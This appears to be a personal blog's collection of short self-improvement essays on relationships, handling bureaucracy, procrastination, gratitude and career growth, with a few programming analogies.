# Climbing mountains

If I read this title, I would think it's some metaphor for some cerebral
'climbing of mountains', but nope, this post is not that.

As ambitious / technical people, there is such a thing as too much
focus. When you want to derive all your happiness from one thing. I
contend that it's not possible. We should climb mountains too, we should
be with our family, exercise our bodies, travel, learn different
languages, and inhale all of life.

But, our craft can not be hurt by this. It needs to be nourished by
this. Now off to figure out how to do that :P.

# Love people who tell you the truth

It's very easy to hate people who tell you the truth. We wouldn't have
phrased the sentence this way unless it was a truth that we don't want
to hear.

They could be people who see talent in you and push you, or see you
neglecting skills and habits that are good for you. You agree with them
of course, but there's a reason you're not doing them, and it's not a
rational one.

The anger you show is anger directed to yourself. You probably realize
it a few hours later, but you can't take back words you said. It might
be the most imperative thing to learn, to see this as it's happening,
stop, and thank the people who love you and are looking out for you.

With their guidance, and only with their guidance, could you get to
where you want to go.

# The Dancing President

Imagine you just saw President Clinton.

And then he made some innapropriate joke, and starting doing pushups.

Okay, that wouldn't happen.

Ask yourself what you're doing, that a leader wouldn't do.

# Notes on dealing with bureaucracy

Bureaucracy is essentially the opposite of what my mental model of the
world is like. Follow instructions, participate in politics, exercise
superficial power.

At first I thought I'd just ignore it, but something odd started
happening. I was planning on printing something, but didn't go into a
large retailer, because I knew I had to fight for hours to override
their policy and let me go to a website to print something.

My enthusiasm for travel diminished a bit, because I knew I had to
possibly deal with border officials. I was scared of police officers.
No, I'm not a drug dealer, but I sure as hell felt like one.

Ignoring bureaucracy was getting in the way of my life. Instead of
asipiring to be resourceful, like in almost all other aspects of my
life, I just shut down when it came to bureaucracy.

That fricking sucked, as you could imagine. The story gets better
though.

It's much easier to deal with it once you learn of their ways. Here's
some point form thoughts, that I might make into longer piece later, but
here's to it being helpful either way.

1\) Never argue or get angry with Bureaucrats. Almost everyone thinks
that they can somehow convince them using their charisma. This won't
happen. If a border official wants to give you bullshit, the more
cavalier you speak, the more opportunity you're giving them to screw you
over.

2\) Instead, you must act like a bureacrat. If they ask you for papers,
provide all the papers. If they say they can't do something, ask them to
give you a copy of the document that says that. If they say they can't
give you the document, ask them for a copy of the document that says
they can't give you the document.

3\) Be patient and cordial, and know that there is no way you're going
to deal with this normally. Simply persevere, give documents, ask for
documents, and if it comes to it, exercise your ability to speak to a
higher up person.

4\) It's important to never, ever, ever, get angry though, or say a
white lie. Even if it's a white lie, they'll use it as the basis to
build a mountain.

# Feeling alone is a choice

This was a poignant realization for me.

You could in reality have people who love you and think you're awesome,
but you could still feel lonely.

Wow. Why is that.

# Do If

If you need to do something, but you find yourself moving it to another
day ask ---

Is today really different from any other day?

Will this get easier to do as time goes on?

If either are not true, do it immedietly. I would first even forget
quality and just get a first version done.

# Sensible person principle

Always assume that if someone did something, it's something that a
sensible person would do.

As a corollary, this is for things that you have no experience in. i.e
if you haven't had a 20 year relationship, don't assume you know what
actions you would take in that position.

# A note on feeling uncool

I've recently had an opportunity to interface with a bunch great people.

There's been times though that I noticed this feeling in my chest, like
I'm 12 and I'd like to impress some cool kid or something.

I've wondered why that happened. I tried to look for commonalaties in
those interactions, and realized this ---

This first, their mental model of the world was different from myne. i.e
Bourgeois political science major.

Because of that, their opinion of me wasn't the highest.

This would be all fine and good, since my opinion of them would not be
also so high.

BUT, *I wanted them to think otherwise.*

I was trying to impress them, and that trying is the killer. It puts you
in a servile paradgim, looking for another person for validation.

I think it's univerally true to never try to impress anyone. The ones
I've felt would be my friends for a while did not require me being
different.

# Love the people closest to you

The people closest to you are the ones that can take your bullshit the
most.

If you're not concious about this, on autopilot you've probably given
them a lot of bullshit. Don't tear the most precious thing you have.

Follow up, do what you say, always, keep them top of mind, help them,
compliment them, be there for them.

# Everyone is shy

It's such a great realization. Most of the times, if you feel
uncofomrtable, the other person is also feeling uncomfortable.

Find empathy and calm in that. We all think aboutt the same things, want
to be good people, want great friends, want to be loved and to love.

# Pattern matching

Recently I wrote a post about feeling
uncool(<http://www.stepanp.com/posts/158>). Though the conclusion is
solid, I was completely about initial thoughts.

In the span of the last few days, the people who I thought didn't like
me, totally did. They were awesome, and we became great friends.

Why did I think they didn't like me? I was pattern matching from
childhood. I.e These types of people are 'cool', they probably like to
do x and y, so they must not like me.

My head ran way too quickly. That's an embarassingly dumb way to think,
but hey, it happens :P.

So to update, when you feel you're not liked, it might actually not be
the case. Try to see if your pattern matching, and interrupt it.

# Don't be daunted

This happens to me every time I tackle a project.

My head starts swimming, running through what I'll have to do. The
project expands and expands, until it becomes a massive monster. At some
point my mind gets caught up, and I get this weird, ugh, I can't do this
feeling.

And once I get started it gets done in a day.

It so simple that we're averse to it: When taking on large projects,
just think about the next step.

Our culture celebrates cerebral thinking, but we shouldn't use it where
it isn't useful.

Just think about the next step! It will get done faster and better, with
less overoptimization

# Show by example

When you are arguing with someone, you are really trying to convince
yourself that you're right.

Why is that? Because you're not certain. How can you become certain?
Prove it. Show it.

That is a much better, more constructive form of argument.

Loved ones still might not listen, but they are in the right not too.
Their situation is different.

What you can do is to set up their underpinnings, so that they come to
the realization themselves.

# How can you help

Something I've found tremendously valuable for me lately -\>

-   Make a small list of the people you love
-   Brainstorm ideas on how you can help them
-   Next time, frame your conversations and help around those.

The reason I stumbled on this framework is because I would often cause
agitation needlessly. For example, for my sister, who is a doctor in
Georgia, I would say something like, oh wouldn't it be cool to start
your own practice, or move to Tbilisi.

This ignored the tribulation she would have to go through to actually
achieve the advice I was giving. And let's be honest, it was just talk.

Instead, I should have thought about the more immediate problems she had
to overcome in order to even think about such grandiose ideas. Then,
think about how I could help them with that.

Conversations frames around actionable things that show you understand
them are better received, and something can actually come out of it

# boxes and bedrock

I've spent the last month or so in Georgia with my sister, celebrating
the birth of her new child.

Though I love the culture here, there are some spots that rub the the
wrong way --- particularily when it came to wealth building.

I'd get into a few arguments about it. On reflection, I think I might be
off.

See, for me, the subject we would talk about could be imagined as a
beautiful modern box. The answer was clear to me.

When I talked to them, I would reply immedietly with my beautiful modern
box answers.

But, during a moment of reflection, It dawned on me that I was just
preparing answers, and wasn't trying to understand what they were
saying.

All of a sudden it wasn't a box anymore, it was bedrock. It had curves
that were edged by large rivers for over hundreds of years. There was
moss growing on the rock. Animals would use this rock for shade, and it
would continue to change over decades.

It was complex, there was no process to fit it in.

I began to *understand* them.

# Important and Valuable

From the excellent interview with Peter Thiel ---
<http://fourhourworkweek.com/category/the-tim-ferriss-show/>

In one section, he talked about how the smartest people study solely for
a tournament-like competition. I can totally relate to feeling this way,
especially when I was into Academia.

This is a reminder to myself to instead focus on doing valuable and
important things.

# Expensive Lessons

I noticed an interesting recurring problem in the last few months.

When I was in Lithuania, I lot my wallet. For the 2 hours it was lost, I
felt pretty darn stupid, everything was in the wallet. I literally would
have to call my parents to get western unioned money.

Yet, now I still carry everything in my wallet.

When I was coming to the US, I knew I would have a hassle moving money
from my Canadian account over to the US. But, I didn't want to let go of
that nice number on my bank account.

Now, in order to get my money I pay a double conversion rate.

All of these are stupid mistakes that could have been easily, easily
avoided. But, I was slacking. I didn't label myself as the type of
person that 'did errands', or 'thought about these things'.

That cost me a bunch, and I won't let it cost me much more.

### From now onwards

-   All errands get done immediately.
-   If for some reason I am not doing an errand, and this day is not
    conceivably different from the next day, I will stop everything I am
    doing and finish that errand.
-   If there's an uncomfortable truth I need to face, like with
    finances, I will stop everything and face it. I will look at the
    numbers.
-   If there's a trip on the way, I will have a backup where my debit
    card will be.

# The most profound form of affection

Is to be fully present with another person,

If you love someone and you are talking to them, give them your full
presence. If you can't, it'll be damaging to continue. Stop, call back
later when you can dedicate a hundred precent of your attention

# Competition

I've been enthralled in Thiel's new book, Zero to One. I find myself
taking much more notes then usual, which is credit to his distilled
thinking.

One of the most interesting examples he gave was to prove his
counterintuitive, but poignant point on competition. *paraphrased - \>*

We are indoctrinated to love competition. Grades measure exactly our
competitiveness. You are taught the same style on the same subject.

As we go up into higher education, it gets worse. You reach higher and
higher levels of competition, until your dreams are beaten out of you.

This is the place where your dreams of being great die, as you become
involved in intense competition with similarly strong peers on trivial
and conventional jobs like management consulting.

Why not create, learn in a way that suits your strengths?

# Oh my turn!

I've observed myself getting in this weird conversation pattern, even
though I don't mean it. For example,

Person says they did X cool thing, or are learning Y thing.

I say oh that's cool, I'm also doing X.

Or even worse,

oh that's cool, I'm doing Y, which is like X but better

Now, I think it's totally fine to talk about what you're up to, but this
whole conversation becomes an strutting contest. Why not let them
finish, see what you can learn. Afterwards, after you really exhausted
what they wanted to say, then maybe continue the conversation about your
experiences with X or Y.

# The saddest thing about large companies

That saddest thing about large companies is that they've stopped
believing that they're employees are competent decision makers.

I just got off from a sucky experience with Expedia and Virgin America.
There was a booking mistake that I made, but instead of 24 hours later,
I found out 48 hours later.

Now this was my mistake, so you can imagine what a day they could have
made for me if they were accommodating.

I've flown over 100,000 miles in the last 2 years, and it was my first
time trying Virgin.

If the person on the other end of the call had any authority, they would
have made the right decision, instead they seem like any other airline
to me now, just a bit more flashy.

It makes sense how a startup can win. Every employee can make decisions,
and they right ones compound quickly.

# Getting pissed off with reality

Among my friends I'm known to be horrible with errands. Not the ha ha
kind of horrible, like I can't get myself to buy a bed for my awesome
apartment kind of bad.

If I didn't have roommates, I don't think I'd have registered for
internet either.

This has been the latest personal goal I've been on, to identify why I
do this and to fix it.

I think I may have gotten a clearer understanding today. Today I woke up
and was ready to start on a project I was excited about. But, the
development environment, which wasn't set up by me, was having trouble.

It's stupid, but I got so frustrated that it was an effort not to show
my dissatisfaction (I'm pretty sure it showed anyways). Typing was
annoying.

Why?

My thought process was "Why is this happening?". "This shouldn't even be
happening". "F \_\*\_ "

I was dissatisfied with the reality of the situation, and I was
defaulting to ignoring my way through. Of course, that's not going to
fly. This might be similar to errands. I think, ugh, why is this not
done, it should just be handled.

Time to grow up a bit I guess. No one will handle these things for me.

# What do you want?

Whenever I feel confused about a self development problem, I often find
that I'm not sure about what I want, and am fumbling around.

# Old for new

There's an ironic correlation when building your relationships:

The more invested your relationship is, the more bs the other party will
to take from you.

Imagine forgetting to call someone you've just met for a month. Well,
they're not your friend anymore. But imagine doing that to your mom,
she'll still be your mom.

If we work by necessity though, we can find ourself investing much more
in the younger relationships, because of how fragile they are.

However, the older ones are much, much more valuable. They've been
stress tested. From thousands of new relationships, only a few of them
will blossom into your close, inner circle.

And then there's family. The relationships you can never replace.

A good rule of thumb can be to invert how you spend time on your
relationships --- 90 % family, 9% close friends, 1% new relationships.

# How did you feel before it even happened?

It can be crippling to deal with events with high upside. You fret over
losing them. Worse, if you actually lose the high upside event, it
really does hurt.

So what to do?

Imagine how you felt before you knew anything about that high upside
event.

Didn't you already feel pretty great? Did you love and were loved by the
right people?

Then, it follows that this high upside event is actually not as
consequential as you think. The worst case isn't catastrophe, but pretty
awesome.

So, go forward and take advantage of them, knowing you'll be just fine
either way :)

# Preparation

I wish I was Steve Balmer right now, so I can prance out of this
computer screen and shout "Preparation" "Preparation" "Preparation"!

Butterflies? Worried about something? Does the world seem unfair?

Step back. Heads down. You've just gotten fuel, and a todo list. It's a
lot of fun, and at the end what you can do is all that will matter.

I feel like our brain can be stuck in the 50s. Yes, there was a time
when you needed some sort signaling to get what you want, but that's not
the case anymore. You don't need to signal, you can just show.

How?

By stepping back, putting your head down, diving deep, learning,
iterating.

# Grateful

I'm feeling a lot of gratitude right now. Most posts I write about are
usually during self reflection during a difficult time.

But, right now I feel great. We should revel in this too.

Grateful for my parents Grateful for my friends Grateful for mes freres
and ma soeur

# Comfort with ambiguity

This has been the hardest trait to train for me, because it's so rare to
come by, and when you do the nature of the problem makes you want to end
it quickly.

Oh, ambiguity.

The pain of not knowing can be so bad, that we can count ourselves out
just to save ourselves from waiting.

But, the gains come from developing comfort with it, understanding it,
reveling in it. This is the time that you're stretching.

# More gratitude

There's no better feeling when someone you respect stands up for you.

Recently, this happened to me. I'm excited to work and prove them right,
and to pay it forward.

# Step by Step

Any project that's worth doing is daunting.

But the first step is never so daunting. So, for large problems, the
solution is to recursively take the first step, until you solve it.

# Context

a quick hack that has been immensely beneficial to me lately :

Before going into any conversation, ask :

What context am I in here?, or more easily phrased: What's going on
here?

What does the other person need? What do I wish to convey? What do I
want? What do they want? How should I approach the conversation?

All of these questions change based on who you're talking with --- your
mom, your sisters, your dad, your colleagues, your friends, your
superiors, potential clients

# Think about the other person

It's a very North-American, or "macho" thing to just do whatever you
want. This can get you far if you're 15, and almost everything you're
supposed to do it pointless, but it can be destructive as you grow
older.

Let's say a friend invites you to a restaurant, and the waiter is
incompetent. What do you do?

If you do whatever you want, you can just insult the waiter.

But, your friend invited you. What if he frequents this place? It'll
suck for him.

I see this in myself quite a bit, and I can see the downsides. You'll
get less introductions and invitations, because your friends won't know
how you'll act.

# Presence

All we have is right now. Pay complete attention

# A moment of frustration

Her: "I've written it all down. I'm the type of person that gets
everything that she puts her mind to it done"

Me: "No you're not, everyone thinks that, you can't leave it to your
willpower. Change your environment!"

Her: "How could I? I have duties to others"

Me: "No, this is hopeless, unless you change your environment!"

I see myself in her, or maybe herself in me. I want her to succeed, but
I don't know what to say. It surely can't be threatening --- "if you
don't do it this way, then it's impossible". People don't change this
way. How do they change though, I'm not sure I have the answer to that.

# Funny awkwardness

Today, I met a millionaire for coffee. What's funny is that both of us
were a bit awkward in the conversation. Thinking about what the other
person was thinking. It feels much more okay to be a bit shy, when you
know everyone is shy.

# Action in Uncertainty

When you are uncertain, ask ---

What is the one thing I can do, which will increase the chance of
everything else working?

# Purpose, not passion

I loved
[this](http://thoughtcatalog.com/ryan-holiday/2014/10/passion-is-the-%20problem-not-the-solution/)
article by Ryan Holiday

# Opaque decision making

There are certain large decisions, where unless you are comfortable with
making them in an opaque environment, you'll always be putting them off,
waiting for the right time, the right information.

For example ---

-   When will your large project launch?
-   When will you see your parents?
-   Should you take this flight to be there for your friend?

It's scary to make the time commitment. Even though you know it's the
right decision in the abstract, at each individual period of time there
will be something that stops you from doing it. Unless you realize that
this will happen forever unless you take action.

# The Buffet Trick

I remember watching an interview of Buffet and Gates, where Buffet gave
this advice, paraphrased ---

Choose a person you really admire. Write down the qualities you like
about them. choose a person you like the least. Write the qualities that
make them that way.

Now, set goals for yourself, aim to be more like the person you admire,
and remove the qualities you share with the person you don't.

Seneca also agrees --- In one of his letters, he talks about how
important it is to have someone to look up to. It's hard to make
something straight without a ruler.

# Don't trust why you think you feel bad

Before you give into your imaginative mind's explanation for why you
feel the way you do, ask ---

-   Is your room clean?
-   Are you talking with your family?
-   Are you having 1 on 1 dinner's with good friends?
-   Are you exercising?
-   Are you sleeping well?

Focus on those instead

# To outsiders, everything at the forefront of innovation will look like a fad.

There's a widespread meme, where it's "cool" to dismiss new technologies
in our field as fads. There's a sort of holier-than-though feeling, as
though if you are learning React, you are wasting your time --- you
could do anything you can do with React, with Backbone.

But, here's two points to think about ---

1\) If it's true with the latest technology, it's also true with your
technology. Instead of using Backbone, you could just use html sprinkled
with some jQuery. Now you won't do that because Backbone gives you the
mental tools that just aren't existent in sprinkled jQuery. If someone
just uses html and jQuery, they will never know what their missing,
because it has worked great for them so far..

2\) It's also interesting to notice that this isn't happening outside of
tech hubs --- nobody talks about the latest and greatest in Albuquerque.
One thing that can infer from this is that tools are usually changing at
the forefront of technology, and they're not changing for no reason.

# Big wins

We're familiar with compound interest in finance, but I think this idea
can be applied more generally. There are skills we can learn, that act
as compound interest for our life.

For example, if you're into programming, and you're a developer, if you
learn to touch type when you're a kid, you get all these wins for the
rest of your life, for free.

Similarily, if you learned to dress well, or read by habit, or ask for
advice, write great emails, or set up great finances, these skills and
habits will continue to pay back dividends for the rest of your life.

When looking for improvement, see if you can knock one of these habits
out first.

# On criticism and insults

First, ask

"Is what this person said true?"

If it is, what is there to be insulted about? Be thankful, and treasure
this person. And then act.

For insults, consider

"Who is the person insulting me?

Do you respect them? If you do, then they aren't insulting you, they are
criticizing you, which is something you can treasure. If they aren't
someone you respect, then can be glad you're doing something they
disapprove of :).

# Intentionally sounding stupid?

Not sure if I am the only one that does this, but in slightly tense
situations, I always notice myself acting a bit more goofy then usual, a
bit too self deprecating. Not sure why this happens, but it definitely
serves no good purpose. If you're reading this, and you have a solution
in mind, send over a ping

# On choice

You can't impose your choice on wealth, on others, on anything outside
of you. In the end, the only thing you have a choice over is your
character, your principles. Then it follows to never compromise it, it's
the only thing we have any choice over.

# Constant

Constant happiness Constant wealth Constant emotions Constant
conversations

I remember my first time riding a horse. It was with business partner
and friend in Mongolia. He was Mongolian, and he really knew how to ride
his horse. He got on, and started galloping.

I think my horse liked his horse, because as soon as his horse started
galloping, myne started galloping too. The constant movement made it
impossible to sit on the horse, I had to stand. Immediately, there was
fear. I looked down, the ground blurring, and it wasn't too hard to
imagine falling under.

But, there comes a choice. You can embrace the anxiety, embrace the
moment, and allow yourself to enjoy it.

Instead of dreaming for what is constant, let's dream to be able to live
with constant change.

# Priorities

An interesting heuristic I've started to apply recently --- To see what
your real priorities are, look at how you spent your last week and group
the hours. Do they match up with your intended priorities?

# What job do I play here?

In recent conversations with family, I've found it super helpful to ask,
what job do I need to do here? What's the purpose of this conversation?
What will make it a successful one?

There's many a time where instead of arguing on specific points with my
parents, I should have realized the conversation was actually about
getting closer to them, learning more about them when they were younger,
having fun.

# Find comfort in looking dumb

When you push your comfort zone, you will invariably get yourself
embarrassed. It's a great sign for tons of growth ahead. When your
stomach starts to knot up after one of these events, remember how normal
this is, and how quickly you'll incorporate those lessons.

# To existential fears: the answer is in process

"What if I never make money, ever?" "What if I never find the love of my
life?" "What if I have no friends"

No matter what, we will invariably ask ourselves these questions. The
knee- jerk answer for me was to list out what I needed to have
accomplished to not feel that. X in the bank, etc.

But, as I come close to achievement, these fears are never assuaged. No
matter how far you go up, you can still fall down.

So, what to do?

Focus on processes. Have you mastered the skills of seeing where you're
bad, improving, seeing what's important and focusing on that. Are you
able to empathize with people, and be mindful of the ones you love?
These skills can never be taken away

# The ambitious person's excuse

When you're working on something, completely involved, completely
devoted to refining, getting better, it becomes easy to rationalize away
anything else.

Friends, family, relationships, health? No time for it, focus. But
really, is there really no time? Why wait for everything to be set
ablaze for you to figure out? Is what you're doing so important, that
you can't show your love, or take a walk?

# An antidote to self-deprecating behavior

I've noticed that sometimes, I speak to my superiors i in a way that's
completely orthogonal to how I'd like to be.

My eyes look down. I speak more quietly with words whimpering out
towards the end of my sentences. Almost like I shouldn't be saying
anything. I make more self-deprecating jokes.

When does this happen ---

Usually a combination of two things --- Either I am talking to someone
I'd like to impress, or I've been working on something frustrating and
hard, and want it to be over quickly.

Both times have the flight-or-flight sense about them.

So how do we address this?

1 ) Remember that you can't really hide who you are. Just be the best
you can, if people like you, they'll like you for this, if somehow you
manage to trick them, what's the point of that?

2 ) Remember to gain pride from acting according to your beliefs, rather
then what others think of you --- Did you try your best, were you
diligent, were you courageous? Then good.

# The Biggest Lever

How do you help the ones you love the most? Money's not the biggest
lever, neither is taking over control, it's empowering them.

Ask, what skills are they missing? And help them get it. It feels great
when you start seeing them take action, put their future in their own
hands, you're anxious a lot less.

In fact, apply this to yourself too. Always ask what skills and
paradigms you're missing, don't just go for the magic pill.

# Always bring up potential screw-ups

Say you're working on a project, and you did something you're not too
sure about. It doesn't *seem* to be a problem, but you're not sure.

Always bring it up. The anxiety you save by avoiding to look dumb is not
worth being incompetent :P.

# Making fun of legacy code

It's universal amongst programmers to complain about the codebase
they're working on --- if only we could rewrite it we say.

But, this doesn't seem genuine to me anymore. It seems like it's a lack
of confidence, of our ability to understand the codebase. We want to
feel like the reason this is hard is because of others, not because we
don't know, and we're looking for validation.

None of that is good or useful.

# 30% done and 90% done

There's two points where it's critical to ask for advice from people you
respect.

The 30% stage, where you would be happy to change direction completely,
and the 90% stage, where you're looking for the final polish.

The 30% stage is the most critical one, but I seldom see people doing
it. If you ask at 90%, it doesn't make sense to give feedback that would
require changing everything, and that's the most valuable type of
feedback.

# The Alarm

One day, you wake up and hit snooze on your alarm clock. Is this day any
different from another day? If not, you've just committed to snoozing on
the alarm clock for the rest of your life.

This is something I try to remember when faced with small, seemingly
inconsequential but actually dangerous moves in life.

# Accidents

Who's fault is it when an accident prevents you from doing what you
needed to do?

Maybe your wifi dies out the last minute you need to get something in.
Maybe things get shuffled around, and you need to deliver earlier then
you expected.

It's your fault --- why leave things to the point where an accident can
screw you up? Build accidents into your plans.

# Do once, have forever

There's a special class of wins you can have in life, that have short
calendar time setup costs, but will win for you for the rest of your
life. It excited me just thinking about it.

Here are a few of them ---

1\) Get a kindle

2\) Get a great checking account

3\) Get a great savings account, and automate payments to it

4\) Read The Beautiful Magic of Tidying up

5\) Get a personal trainer

6\) Set up a system to get laundry done

7\) Set up a system to have fun stuff to do with friends on Saturdays

8\) Set up trips throughout the year to see family, or do something
adventurous. Spend 2 days just buying all the plane tickets, and you
have a guaranteed good year.

# Try

I think a lot about living a life with no regrets. I think the key to
this is the philosophy to try your hardest, with anything you do. Know
your odds, but don't let odds influence how hard you try. Push every
part of your being, experience life completely, learn from mistakes,
grow, get better

# Default State

This seems obvious, but was a mind shifter for me, when I first heard it
said this way ---

There's execution mode, and there's planning mode.

Your *default* state should be execution.

You should feel viscerally that progress only happens in execution mode,
not in planning mode.

Make a decision in planning mode, then get heads down in execution mode.
Don't question your plan until you've accomplished the objective, or
something completely blocking happens. Don't re-evaluate until then.

# fear vs being a person who is afraid

A friend of myne phrased this excellently ---

No fear is as bad as becoming a person who is afraid.

# Two ideas of willpower

I always thought of willpower as a scarce resource, to be treated with
great respect. Never waste it if you don't have to.

Another way to look at willpower, is as a muscle. Train it to become
stronger.

# Embarrassment is the cost of growth

This realization gives me a lot of peace, anytime I venture into
unfamiliar territory, and eventually embarass myself.

Maybe you get into a conversation with high level people, or you make a
very fundamental mistake on something you are learning. It can feel like
you should just hide under a hole, but remember, this is the cost of
growth. If you want to become the person who is calm under those
situations, who knows the subject at a deep level, you need to go
through many, many series of them.

# Say it 3 times

This is one of the biggest wins I've had recently.

When you speak, be aware that this is the medium where almost all the
information gets lost on the way. People will not understand you.

Instead of trying to say 10 things, and have people understand 2, say 3
things three times and have people understand 3.

# On feeling bad

Feeling bad is both the avenue to success and to failure.

It's a signal, that something is wrong and you need to improve.

The problem though, is that as your mind searches for solutions, this
first 10 will be self-destructive. Make sure to pass the first 10.

# Don't wallow

No matter how bad you feel, or how bad something gets, how big your
losses are, don't let yourself wallow, for more then a little bit.

Repeat to yourself, that you are the type of person that fights it
through, no matter what.

# Be a Pro

In software engineering, the current atmosphere is relaxed --- you go at
your leisure, there are no real deadlines, you don't have to take care
of yourself, you barely need to grow.

Compare how people approach software engineering, or any profession, to
that of an athlete. The athlete, is constantly pushing further, getting
1 on 1 instruction, being meticulous about form, extreme about
discipline.

Let's raise our standards.

# Don't forget why

As we navigate through our lives, we start to see bribes, disguised as
wants.

Analyze your actions, and ask, why I am doing what I'm doing?

Is it because of these new bribes? Focus back in on the core.

# See opportunity

Every experience is a tool for learning. See opportunity in that. Get
thrilled about it, double down!

# Empathetic cool

Recently I saw a disagreement two people I loved, and I just yelled at
both of them.

That only makes it worse, embarrasses both of them, and entrenches them
in their choices even more.

Instead, I should have practice empathetic cool. Not getting angry, but
lovingly showing them the reason each person was acting the way there
were.

# Patience

Stupid decisions get made when one thinks that something has to happen,
now.

The reasoning is usually that if it doesn't happen now, it will never
happen, ever.

This is true for only 1% of problems. For the rest, patience will get
you there. Know, with full confidence, that you will get what you want,
with effort ant patience.

# Distributed Systems and Getting Things Done

In most programs, it's best to have a single app state, that trickles
down, and are handled by pure functions.

Erlang takes quite a different approach. There are Supervisors, and
Actors, which encapsulate internal state, and talk to eachother via
messages.

This seems more complex, but actually, it is simpler when looked at by
the lens of distributed software. It's complex to keep a single state in
sync when you're across datacenters.

What Erlang does is, to essentially embrace the distributed nature of
the problem, and goes by the assumption that if each Supervisor takes
care of what it's responsible for well, then the system will work.

This was a pretty breakthrough parallel for me, in my task management.
Instead of trying to build a top down system, it's all about making sure
the small parts work well.

Getting Things Done, by David Allen, is the Erlang of task management x)

# Be okay with thinking

Bertrand Russell once wrote a piece that I am about to bastardize, but
it has been hugely impactful for me since I read it. He said, when
working on complex problems, think as hard you can about it, then stop,
and go about your day. Be okay with not being able to produce an answer,
or do something right away. Let your mind think it over, the answer will
come

# Commitment

We're taught that keeping our options open is always good. But, the more
I mature, the less good I see in that path. It introduces anxiety, and
reduces how deep you are willing to go, how much you're willing to put
on the line, how much pride you take in what you do.

# On expanding scope

I reflected recently about the moments where I felt the happiest. The
moments where I saw the largest gain, or experienced person growth.
During these moments, the one constant was that I was thinking about
something greater than myself --- family, team, friends.

Then I thought of the moments where I was the closest to causing
irreparable damage. In these moments the constant was that I was
internally focused, worried about myself, anxious.

# Consumption

When procrastinating, give yourself a hard rule --- you can only
produce. No more consumption. You don't have do what you're
procrastinating about, but you do need to produce.

# A mismatch in standards

When we look deep within ourselves, and re-examine our values, we wake
up. We realize that the standards the world sets of us, are lower than
the standards our values set for us. No one will complain to you if you
are okay at something, but your values demand art. No one will complain
to you if you are nice, but your values demand realness.

# When someone shushes you

I can be a bit of a loud speaker. Especially when I get on a skype call
and have headphones on. One of the things I dread the most is when
someone shushes me. I almost always react back, and essentially say
'deal with it'. This always makes me feel quite bad. The reason is that
I honestly knew that I am imposing, but I also felt that it is rude of
them to talk to me in the way that they do. When I react, it isn't
congruent with the type of person I want to be, and I feel off long
after. One time, a man interrupted me as I was sittings outside of a
cafe, and I told him, 'I am sorry, though it is outside'. He misheard
me, and thought I said 'I am sorry, but we are excited', he laughted and
empathized. I realized, this was the secret --- from now on, instead of
reacting back, make light of it. It saves face for both of us, and is
congruent with who I am. This kind of lesson applies throughout life ---
instead of getting angry, taking it lightly, empathize.

# Systems

When you build a system, you don't just stop when it works once. The
complexity comes from building fault tolerance, scale, both in features
and usage, as well as reliability. We need to apply to that our lives. I
often find myself always at the beginning stage of building a system ---
'Okay, now I will work out every day and wake up at 5am and rainbows all
around'. What will happen if I don't? What will happen when it's a bad
day?

# Selfishness

I notice within myself, that when I am focused on myself, nothing goes
the way I want it too. It's easier to become resentful, the world will
warp to our problems. The antitode is to look outwards. For what purpose
do we work? How can we help others?

# On the overwhelming warmth and beauty in humanity

As we introspect, the world separates from us. We start asking, what do
we want? We almost dehumanize those around us. But if we open our eyes,
we start see expressions on people's faces. We start to sense the
emotions they feel, when they wonder what we're thinking. At that
moment, it's almost silly. Wow, how together we really are, how much of
the human experience we really share.

# Proactivity

I sometimes jokingly say to friends, 'always be on the attack', or 'be
like a tiger'. It is in jest, but the root of it is about proactivity.
Focus on what you can control

# On Agency

It is a beautiful realization, to see that every human around you,
different as they may be, experience the world in a fundamentally
similar way. We are all constrained by a lack prescient knowledge. None
of us know the future, and this means that your boss, you, and every
human on this earth is on level ground. There are of course differences
in knowledge and leverage between people, but when compared to prescient
knowledge, it's insignificant. This is what allows young hackers to
topple corporations. We are all working with information, trying our
best to adapt to a world that no one truly understands.

For me, working with this belief has both increased my empathy and
empowered me. In this framework, the world is your oyster, at least as
much as it is someone else's. Don't wait for people to tell you what to
do, *think*. What are the opportunities at present? How can we be
impactful? What leverage can I use?

After starting to do this, you'll be surprised to see many people you
looked up to are doing the same thing. It's not prescient knowledge, but
an honest effort from humans to lead and adapt.

# See the world clearly Part 1 --- Business

From four years of startups and engineering, a main idea has unraveled.
In 4 words, **see the world clearly.**

From business, engineering, or careers, learning to see the world
clearly was the most impactful factor I saw for growth. The funny thing
is, for each instance, the lesson was re-learned.

I'll try to tell the stories for each one. The first one: **business**

In 2012, I moved to China to start a company. To fend off the imminent
disappearance of my bank balance, the first thing I did was to run a
consulting offer. Taking cues from copywriting books I was reading, I
made a long-form you-are-going-to-miss-out-unless-you-act-now style page
and published it to the world.

To my surprise, a person with a business in Thailand signed up and sent
an initial payment. Excitedly, I sent over an email to get started...

Three days of anxious waiting later, I was convinced that the email was
ignored... on purpose. Following the copywriting-style books I was
reading, I sent an
are-you-in-or-are-you-out-because-it-closes-now-now-now email. She
responded, and said four things:

-   Sorry, I was overwhelmed with orders.
-   Stop speaking in such a sleazy way.
-   Do you want to come to Thailand?
-   Do you want to do a retainer kind of thing?

Now, how do you think I responded to this? "Sorry about that. The
retainer sounds great, I can visit Thailand next month, let's go scuba
diving?"

Nope:

-   Sleazy? I was just trying to see if you were in or not!
-   I am too much of an important business man for this
-   Here, have your money back, go get a massage if you are so busy

...

What could have possessed me to interpret the email in this way? Fear.
The fear that I had no idea what I was doing. The fear that I was not a
successful business person, and the fear that I didn't have what it took
to succeed.

In order to avoid facing this fear, *I had to warp the world around me.*
I had to think *she* was crazy.

In this case, my insecurities were directly contributing to my failure.
What a cycle --- warp the world to hide your insecurities, make your
insecurities worse.

At least in this domain, the lesson was clear. Own exactly where you
stand --- I was just a 19 year old kid who had less then a thousand
dollars in the bank. There was a long road ahead.

As I opened up my vulnerability in business, I noticed that my mentors
become more open, opportunities sprouted, and a path to improvement was
unraveling. I owned that I was a kid who had never filed his taxes
before and it felt great. It felt like the pandoras box had opened, and
all my insecurities vanished.

Or so I thought. Though I was oblivious, it was clear to anyone, as soon
as they ask asked me what I thought about "those engineers in San
Francisco"

(Part 2 coming soon: Engineering)

# On Communicating Clearly

When you communicate clearly, you take risks:

Ostracization.

Breaking rapport.

Looking dumb

But,

To truly form a group, you must have opinions others disagree about. If
you don't risk ostracization, you can't form groups in the first place.

To truly build rapport, you must agree on something others disagree
about. If you don't risk breaking rapport, then you can't strengthen it.

To be smart, you must have opinions that others think are wrong. If you
don't risk looking dumb, you can't even be smart.

# Why critics think they're right

